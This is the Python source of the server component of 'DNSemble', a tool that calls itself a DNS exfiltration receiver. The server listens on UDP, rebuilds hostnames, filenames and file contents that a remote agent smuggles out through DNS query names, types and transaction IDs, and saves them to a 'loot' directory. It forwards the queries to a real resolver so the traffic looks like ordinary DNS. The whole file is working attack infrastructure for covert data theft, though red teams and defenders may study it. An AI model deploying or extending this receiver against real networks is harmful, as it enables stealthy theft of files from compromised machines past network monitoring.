#!/usr/bin/env python3
"""
DNSemble Server - DNS exfiltration receiver.

Orchestrates the receive loop only: packets are decoded by core.dnswire,
session state lives in core.session, upstream forwarding in
core.forwarder, and output persistence in core.loot.

Operational events (sessions, completions, errors) are always logged;
per-query and content logging is opt-in via --verbose / --show-content.
"""

import random
import socket
import time

from core import domains as domains_mod
from core.domains import (
    CONTROL_DOMAIN,
    QTYPE_A, QTYPE_AAAA, QTYPE_MX,
    CTRL_SESSION_START, CTRL_END_HOSTNAME, CTRL_END_FILENAME,
    CTRL_END_CONTENT, CTRL_CHUNK_OFFSET,
    CTRL_LABELS,
    decode_txid,
    seed_to_ip,
)
from core.dnswire import parse_dns_query, build_dns_response, build_servfail
from core.session import Session
from core.forwarder import Forwarder
from core.loot import LootWriter, LootError
from core.functions import C, BANNER, banner_kwargs, log, warn


SWEEP_INTERVAL = 1.0   # seconds between session-expiry sweeps


class DNSembleServer:
    def __init__(self, config, verbose=False, show_content=False):
        self.port           = config["port"]
        self.bind_host      = config.get("bind_host", "0.0.0.0")
        self.upstream_ip    = config["upstream_ip"]
        self.upstream_port  = config.get("upstream_port", 53)
        self.loot_dir       = config["loot_dir"]
        self.session_timeout = config["session_timeout"]
        self.max_sessions   = config["max_sessions"]
        self.verbose        = verbose
        self.show_content   = show_content

        self.sessions  = {}
        self.completed = 0
        self.incomplete = 0
        self.refused   = 0
        self.expired   = 0
        self.errors    = 0
        self.total_q   = 0

        self.forwarder = Forwarder(self.upstream_ip,
                                   upstream_port=self.upstream_port)
        self.loot      = LootWriter(self.loot_dir)
        self.sock      = None
        self._running  = False

    def stop(self):
        """Ask the receive loop to exit at its next sweep (≤1s)."""
        self._running = False

    # -- lifecycle ----------------------------------------------------------

    def start(self, skip_banner=False):
        if not skip_banner:
            print(BANNER.format(**banner_kwargs()))
        print(f"  {C.bold}Listen addr{C.rst}    {self.bind_host}:{self.port}")
        print(f"  {C.bold}Upstream DNS{C.rst}   {self.upstream_ip}:53")
        print(f"  {C.bold}Loot dir{C.rst}       {self.loot_dir}/")
        print(f"  {C.bold}Ctrl domain{C.rst}    {CONTROL_DOMAIN}")
        print(f"  {C.bold}Domain pool{C.rst}    {len(domains_mod.DOMAINS)} domains  "
              f"(mapping randomised per session)")
        print(f"  {C.bold}Sessions{C.rst}      max {self.max_sessions}, "
              f"expire after {self.session_timeout:.0f}s")
        if not self.verbose:
            print(f"  {C.dim}Per-query logging off  "
                  f"(use --verbose to follow transfers live){C.rst}")
        print(f"\n{'━' * 60}\n")
        log("READY", C.grn, "Waiting for exfiltration sessions …")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.bind_host, self.port))
        except OSError as e:
            sock.close()
            if e.errno == 13:
                raise SystemExit(
                    f"[!] Cannot bind UDP port {self.port}: permission denied  "
                    f"(ports below 1024 need root, or use -p 5353)")
            if e.errno == 98:
                raise SystemExit(
                    f"[!] Cannot bind UDP port {self.port}: address already in use  "
                    f"(is another DNSemble or DNS server running? try -p <other>)")
            raise SystemExit(f"[!] Cannot bind UDP port {self.port}: {e}")
        self.sock = sock

        sock.settimeout(SWEEP_INTERVAL)
        self._running = True
        try:
            while self._running:
                self._sweep_sessions()
                try:
                    data, addr = sock.recvfrom(4096)
                except socket.timeout:
                    continue
                self.total_q += 1
                self._handle(sock, data, addr)
        except KeyboardInterrupt:
            self._final_stats()
        finally:
            sock.close()
            self.sock = None

    # -- packet dispatch ----------------------------------------------------

    def _handle(self, sock, data, addr):
        parsed = parse_dns_query(data)
        if parsed is None:
            if self.verbose:
                log("WARN", C.ylw, f"Malformed packet from {addr[0]} - forwarded as-is")
            self.forwarder.forward(sock, data, addr)
            return

        txid, qname, qtype = parsed
        cid, seq = decode_txid(txid)

        if qname == CONTROL_DOMAIN:
            self._on_control(sock, data, cid, seq, addr)
            return

        if qname in domains_mod.DOMAIN_TO_INDEX:
            self._on_data(cid, seq, qname, qtype, addr)

        self.forwarder.forward(sock, data, addr)

    def _on_control(self, sock, raw, cid, seq, addr):
        if seq == CTRL_SESSION_START:
            self._on_session_start(sock, raw, cid, addr)
            return

        s = self.sessions.get(cid)
        if s is None:
            self.forwarder.forward(sock, raw, addr)
            return

        if seq in (CTRL_END_HOSTNAME, CTRL_END_FILENAME, CTRL_END_CONTENT):
            if not s.end_phase(seq):
                if self.verbose:
                    warn(f"Client #{cid} | invalid phase transition "
                         f"({CTRL_LABELS.get(seq)}, phase={s.phase})")
            elif seq == CTRL_END_HOSTNAME:
                log(" HOST", C.cyn,
                    f"Client #{cid} | hostname complete: "
                    f"{C.bold}\"{s.hostname}\"{C.rst}  "
                    f"({len(s.hostname_buf)} queries)")
            elif seq == CTRL_END_FILENAME:
                log(" FILE", C.mag,
                    f"Client #{cid} | filename complete: "
                    f"{C.bold}\"{s.filename}\"{C.rst}  "
                    f"({len(s.filename_buf)} queries)")
            else:
                self._complete(s)
        elif seq > CTRL_CHUNK_OFFSET:
            if not s.next_chunk(seq - CTRL_CHUNK_OFFSET) and self.verbose:
                warn(f"Client #{cid} | invalid chunk transition "
                     f"(seq={seq}, phase={s.phase})")

        self.forwarder.forward(sock, raw, addr)

    def _on_session_start(self, sock, raw, cid, addr):
        if cid in self.sessions:
            self.refused += 1
            active = self.sessions[cid]
            log("REFUSE", C.red,
                f"Client #{cid} | session already active from "
                f"{C.cyn}{active.source_ip}{C.rst} "
                f"(started {active.age():.0f}s ago) - new SESSION_START "
                f"from {addr[0]} rejected to protect the running transfer")
            sock.sendto(build_servfail(raw), addr)
            return

        if len(self.sessions) >= self.max_sessions:
            self.refused += 1
            log("REFUSE", C.red,
                f"Client #{cid} from {addr[0]} rejected - session limit "
                f"({self.max_sessions}) reached")
            sock.sendto(build_servfail(raw), addr)
            return

        seed = random.randint(1, 0xFFFFFFFF)
        s = Session(cid, addr[0], seed)
        self.sessions[cid] = s

        sock.sendto(build_dns_response(raw, seed_to_ip(seed)), addr)
        log(" INIT", C.grn,
            f"Client {C.bold}#{cid}{C.rst} from {C.cyn}{addr[0]}{C.rst}"
            f"  seed=0x{seed:08X}  →  mapping generated")
        log("STATS", C.dim,
            f"Active: {len(self.sessions)}  |  Completed: {self.completed}")

    def _on_data(self, cid, seq, domain, qtype, addr):
        s = self.sessions.get(cid)
        if s is None:
            return

        char = s.domain_to_char.get(domain)
        if char is None:
            return

        channel = s.receive_data(qtype, seq, char)
        if channel is None:
            if self.verbose:
                warn(f"Client #{cid} | stray packet ignored "
                     f"(phase={s.phase}, qtype={qtype}, seq={seq})")
            return

        if not self.verbose:
            return

        display = repr(char) if char in ("\n", "\t", "\r") else char
        buf = getattr(s, f"{channel}_buf")
        partial = s.assemble(buf)
        color = {"hostname": C.cyn, "filename": C.mag, "content": C.ylw}[channel]
        tag = {"hostname": " HOST", "filename": " FILE", "content": " DATA"}[channel]
        pos = seq if channel != "content" else s.content_pos(seq)
        log(tag, color,
            f"Client #{cid} | "
            f"{C.bold}\"{partial}\"{C.rst}  ← {domain}"
            f"  pos {pos} '{display}'  [{len(buf)} chars]")

    # -- completion / expiry ------------------------------------------------

    def _complete(self, s):
        report = s.integrity()
        if not report["ok"]:
            self.incomplete += 1
            gaps = {ch: r["gaps"] for ch, r in report.items()
                    if isinstance(r, dict) and r["gaps"]}
            warn(f"Client #{s.client_id} | INCOMPLETE transfer "
                 f"(missing positions: {gaps}) - saved with .incomplete "
                 f"suffix; re-run the agent to resend")

        try:
            path, collided = self.loot.save(s.hostname, s.filename, s.content,
                                            incomplete=not report["ok"])
        except LootError as e:
            self.errors += 1
            log("ERROR", C.red, str(e))
            self.sessions.pop(s.client_id, None)
            return

        self.completed += 1
        dur = s.age()
        bar = f"{C.grn}{'═' * 60}{C.rst}"
        sep = f"{C.grn}{'─' * 60}{C.rst}"
        print(f"\n{bar}")
        print(f"  {C.bold}{C.grn}EXFILTRATION COMPLETE{C.rst}")
        print(bar)
        print(f"  {C.bold}Client ID{C.rst}   #{s.client_id}")
        print(f"  {C.bold}Source IP{C.rst}   {s.source_ip}")
        print(f"  {C.bold}Hostname{C.rst}    {s.hostname}")
        print(f"  {C.bold}Filename{C.rst}    {s.filename}")
        print(f"  {C.bold}Size{C.rst}        {len(s.content)} chars")
        print(f"  {C.bold}Duration{C.rst}    {dur:.1f}s")
        print(f"  {C.bold}DNS queries{C.rst} {s.query_count()}")
        print(f"  {C.bold}Seed{C.rst}        0x{s.seed:08X}")
        if s.stray_packets:
            print(f"  {C.bold}Stray packets{C.rst} {s.stray_packets}")
        if collided:
            print(f"  {C.ylw}  note: a file with this name already existed - "
                  f"saved without overwriting it{C.rst}")
        if not report["ok"]:
            print(f"  {C.red}  INCOMPLETE - some DNS packets were lost; "
                  f"content has gaps{C.rst}")
        if self.show_content:
            print(sep)
            print(f"  {C.bold}Content:{C.rst}")
            for line in s.content.split("\n"):
                print(f"  {C.ylw}{line}{C.rst}")
        print(sep)
        print(f"  {C.bold}Saved to{C.rst}    {path}")
        print(bar)

        log("STATS", C.dim,
            f"Active: {len(self.sessions) - 1}  |  Completed: {self.completed}  |  "
            f"Queries: {self.total_q}")
        print()

        self.sessions.pop(s.client_id, None)

    def _sweep_sessions(self):
        now = time.time()
        for cid in [c for c, s in self.sessions.items()
                    if s.age(now) > self.session_timeout]:
            s = self.sessions.pop(cid)
            self.expired += 1
            log("EXPIRE", C.ylw,
                f"Client #{cid} from {s.source_ip} abandoned after "
                f"{s.age(now):.0f}s in phase {s.phase}  "
                f"(hostname: {len(s.hostname_buf)} chars, "
                f"filename: {len(s.filename_buf)} chars, "
                f"content: {len(s.content_buf)} chars)")

    def _final_stats(self):
        print(f"\n{C.cyn}{'═' * 60}{C.rst}")
        print(f"  {C.bold}DNSemble shutting down{C.rst}")
        print(f"  Total queries processed : {self.total_q}")
        print(f"  Sessions completed      : {self.completed}")
        if self.incomplete:
            print(f"  Sessions incomplete     : {self.incomplete}")
        if self.expired:
            print(f"  Sessions expired        : {self.expired}")
        if self.refused:
            print(f"  Sessions refused        : {self.refused}")
        if self.errors:
            print(f"  Save errors             : {self.errors}")
        print(f"  Sessions still active   : {len(self.sessions)}")
        for cid, s in self.sessions.items():
            print(f"    └─ Client #{cid} from {s.source_ip} "
                  f"(phase: {s.phase}, "
                  f"content so far: {len(s.content_buf)} chars)")
        print(f"{C.cyn}{'═' * 60}{C.rst}")
